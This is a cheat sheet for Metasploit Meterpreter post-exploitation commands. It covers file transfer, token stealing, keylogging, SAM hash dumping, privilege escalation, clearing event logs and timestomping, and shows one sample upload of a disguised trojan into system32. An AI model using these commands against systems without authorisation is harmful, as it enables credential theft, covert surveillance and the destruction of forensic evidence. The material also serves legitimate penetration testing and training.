Metasploit meterpreter command cheat sheet

# Core Commands

- ? - help menu
- background - moves the current session to the background
- bgkill - kills a background meterpreter script
- bglist - provides a list of all running background scripts
- bgrun - runs a script as a background thread
- channel - displays active channels
- close - closes a channel
- exit - terminates a meterpreter session
- help - help menu
- interact - interacts with a channel
- irb - go into Ruby scripting mode
- migrate - moves the active process to a designated PID
- quit - terminates the meterpreter session
- read - reads the data from a channel
- run - executes the meterpreter script designated after it
- use - loads a meterpreter extension
- write - writes data to a channel  

# File Sytem Commands

- cat - read and output to stdout the contents of a file
- cd - change directory on the victim
- del - delete a file on the victim  
- download - download a file from the victim system to the attacker system  

When we need to retrieve a file from the target we use the download command, which tranfers the specified file into our local working directory. In this evetn that we need to recursively download an entire directory, we use the download -r command.

meterpreter > download c:\\boot.ini
[*] downloading: c:\boot.ini -> c:\boot.ini
[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini

- edit - edit a file with vim  

To edit a file using our default text editor we use edit command. Behind the sences, Meterpreter will download a copy of file to a temp directory, then upload the new file when the edit is complete.

- getwd - print working directory
- lcd - change local directory
- lpwd - print local directory
- ls - list files in current directory
- mkdir - make a directory on the victim system
- pwd - print working directory
- rm - delete a file
- rmdir - remove directory on the victim system
- upload - upload a file from the attacker system to the victim  

To send a file to the target system we use the upload command, using the -r switch to recursively upload directories and their contents. In the following example we are uploading a falsely named Meterpreter payload.

meterpreter > upload evil_trojan.exe c:\\windows\\system32
[*] uploading  : evil_trojan.exe -> c:\windows\system32
[*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
meterpreter >  

# Networking Commands

- ipconfig - displays network interfaces with key information including IP address, etc.
- portfwd - forwards a port on the victim system to a remote service
- route - view or modify the victim routing table  

# System Commands

- clearav - clears the event logs on the victim's computer
- drop_token - drops a stolen token
- execute - executes a command
- getpid - gets the current process ID (PID)
- getprivs - gets as many privileges as possible
- getuid - get the user that the server is running as
- kill - terminate the process designated by the PID
- ps - list running processes
- reboot - reboots the victim computer
- reg - interact with the victim's registry
- rev2self - calls RevertToSelf() on the victim machine
- shell - opens a command shell on the victim machine
- shutdown - shuts down the victim's computer
- steal_token - attempts to steal the token of a specified (PID) process
- sysinfo - gets the details about the victim computer such as OS and name  

# User Interface Commands

- enumdesktops - lists all accessible desktops
- getdesktop - get the current meterpreter desktop
- idletime - checks to see how long since the victim system has been idle
- keyscan_dump - dumps the contents of the software keylogger
- keyscan_start - starts the software keylogger when associated with a process such as Word or browser
- keyscan_stop - stops the software keylogger
- screenshot - grabs a screenshot of the meterpreter desktop
- set_desktop - changes the meterpreter desktop
- uictl - enables control of some of the user interface components  

# Privilege Escalation Commands

- load priv

- getsystem – uses 15 built-in methods to gain sysadmin privileges
Password Dump Commands

- hashdump – grabs the hashes in the password (SAM) file
Timestomp Commands

- timestomp – manipulates the modify, access, and create attributes of a file